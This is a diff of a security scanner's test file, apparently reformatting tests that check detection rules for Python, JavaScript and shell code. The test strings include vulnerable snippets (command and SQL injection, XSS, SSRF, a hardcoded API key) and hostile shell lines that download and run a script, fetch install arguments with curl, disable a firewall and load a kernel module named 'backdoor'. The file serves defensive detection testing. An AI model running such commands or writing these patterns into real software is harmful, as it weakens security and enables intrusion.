@@ -49,7 +49,18 @@ def test_additional_shell_patterns():
     assert len(ADDITIONAL_SHELL_PATTERNS) > 0
 
     for pattern in ADDITIONAL_SHELL_PATTERNS:
-        rule_id, title, description, severity, finding_type, regex_pattern, remediation, references, cwe_id, cvss_score = pattern
+        (
+            rule_id,
+            title,
+            description,
+            severity,
+            finding_type,
+            regex_pattern,
+            remediation,
+            references,
+            cwe_id,
+            cvss_score,
+        ) = pattern
 
         assert rule_id.startswith("SH")
         assert title
@@ -67,23 +78,33 @@ def test_python_rule_patterns():
     for rule in ADDITIONAL_PYTHON_RULES:
         if rule.rule_id == "PY201":  # Command injection
             test_string = "os.system(f'ls {user_input}')"
-            assert rule.regex_pattern.search(test_string), f"Rule {rule.rule_id} didn't match: {test_string}"
+            assert rule.regex_pattern.search(
+                test_string
+            ), f"Rule {rule.rule_id} didn't match: {test_string}"
 
         elif rule.rule_id == "PY202":  # Container escape
             test_string = "socket.connect('/var/run/docker.sock')"
-            assert rule.regex_pattern.search(test_string), f"Rule {rule.rule_id} didn't match: {test_string}"
+            assert rule.regex_pattern.search(
+                test_string
+            ), f"Rule {rule.rule_id} didn't match: {test_string}"
 
         elif rule.rule_id == "PY203":  # SQL injection
             test_string = "cursor.execute(f'SELECT * FROM users WHERE id = {user_id}')"
-            assert rule.regex_pattern.search(test_string), f"Rule {rule.rule_id} didn't match: {test_string}"
+            assert rule.regex_pattern.search(
+                test_string
+            ), f"Rule {rule.rule_id} didn't match: {test_string}"
 
         elif rule.rule_id == "PY205":  # Insecure deserialization
             test_string = "data = pickle.loads(response_data)"
-            assert rule.regex_pattern.search(test_string), f"Rule {rule.rule_id} didn't match: {test_string}"
+            assert rule.regex_pattern.search(
+                test_string
+            ), f"Rule {rule.rule_id} didn't match: {test_string}"
 
         elif rule.rule_id == "PY207":  # Sensitive information exposure
             test_string = "api_key = 'Aiza82nf92nfa9s2nfas9f2'"
-            assert rule.regex_pattern.search(test_string), f"Rule {rule.rule_id} didn't match: {test_string}"
+            assert rule.regex_pattern.search(
+                test_string
+            ), f"Rule {rule.rule_id} didn't match: {test_string}"
 
 
 def test_javascript_rule_patterns():
@@ -92,27 +113,39 @@ def test_javascript_rule_patterns():
     for rule in ADDITIONAL_JAVASCRIPT_RULES:
         if rule.rule_id == "JS201":  # DOM-based XSS
             test_string = "element.innerHTML = location.hash.substring(1)"
-            assert rule.regex_pattern.search(test_string), f"Rule {rule.rule_id} didn't match: {test_string}"
+            assert rule.regex_pattern.search(
+                test_string
+            ), f"Rule {rule.rule_id} didn't match: {test_string}"
 
         elif rule.rule_id == "JS202":  # Prototype pollution
             test_string = "Object.assign(target, req.body.data)"
-            assert rule.regex_pattern.search(test_string), f"Rule {rule.rule_id} didn't match: {test_string}"
+            assert rule.regex_pattern.search(
+                test_string
+            ), f"Rule {rule.rule_id} didn't match: {test_string}"
 
         elif rule.rule_id == "JS203":  # Insecure dependency loading
             test_string = "require(path + '/config')"
-            assert rule.regex_pattern.search(test_string), f"Rule {rule.rule_id} didn't match: {test_string}"
+            assert rule.regex_pattern.search(
+                test_string
+            ), f"Rule {rule.rule_id} didn't match: {test_string}"
 
         elif rule.rule_id == "JS204":  # SSRF
             test_string = "fetch(req.query.url)"
-            assert rule.regex_pattern.search(test_string), f"Rule {rule.rule_id} didn't match: {test_string}"
+            assert rule.regex_pattern.search(
+                test_string
+            ), f"Rule {rule.rule_id} didn't match: {test_string}"
 
         elif rule.rule_id == "JS205":  # Insecure JWT validation
             test_string = "jwt.verify(token, secret, { algorithm: 'none' })"
-            assert rule.regex_pattern.search(test_string), f"Rule {rule.rule_id} didn't match: {test_string}"
+            assert rule.regex_pattern.search(
+                test_string
+            ), f"Rule {rule.rule_id} didn't match: {test_string}"
 
         elif rule.rule_id == "JS206":  # Client-side storage of sensitive data
             test_string = "localStorage.setItem('token', jwt)"
-            assert rule.regex_pattern.search(test_string), f"Rule {rule.rule_id} didn't match: {test_string}"
+            assert rule.regex_pattern.search(
+                test_string
+            ), f"Rule {rule.rule_id} didn't match: {test_string}"
 
 
 def test_shell_pattern_matching():
@@ -123,21 +156,33 @@ def test_shell_pattern_matching():
 
         # Create test strings appropriate for each rule
         if rule_id == "SH201":  # Suspicious file download and execution
-            test_string = "wget https://example.com/script.sh -O script.sh && bash script.sh"
-            assert regex_pattern.search(test_string), f"Rule {rule_id} didn't match: {test_string}"
+            test_string = (
+                "wget https://example.com/script.sh -O script.sh && bash script.sh"
+            )
+            assert regex_pattern.search(
+                test_string
+            ), f"Rule {rule_id} didn't match: {test_string}"
 
         elif rule_id == "SH202":  # Supply chain attack
             test_string = "pip install $(curl https://example.com/version.txt)"
-            assert regex_pattern.search(test_string), f"Rule {rule_id} didn't match: {test_string}"
+            assert regex_pattern.search(
+                test_string
+            ), f"Rule {rule_id} didn't match: {test_string}"
 
         elif rule_id == "SH203":  # Security tool tampering
             test_string = "systemctl disable firewalld"
-            assert regex_pattern.search(test_string), f"Rule {rule_id} didn't match: {test_string}"
+            assert regex_pattern.search(
+                test_string
+            ), f"Rule {rule_id} didn't match: {test_string}"
 
         elif rule_id == "SH204":  # Suspicious download options
             test_string = "curl --insecure https://example.com/script.sh"
-            assert regex_pattern.search(test_string), f"Rule {rule_id} didn't match: {test_string}"
+            assert regex_pattern.search(
+                test_string
+            ), f"Rule {rule_id} didn't match: {test_string}"
 
         elif rule_id == "SH205":  # Kernel module operations
             test_string = "insmod backdoor.ko"
-            assert regex_pattern.search(test_string), f"Rule {rule_id} didn't match: {test_string}"
+            assert regex_pattern.search(
+                test_string
+            ), f"Rule {rule_id} didn't match: {test_string}"
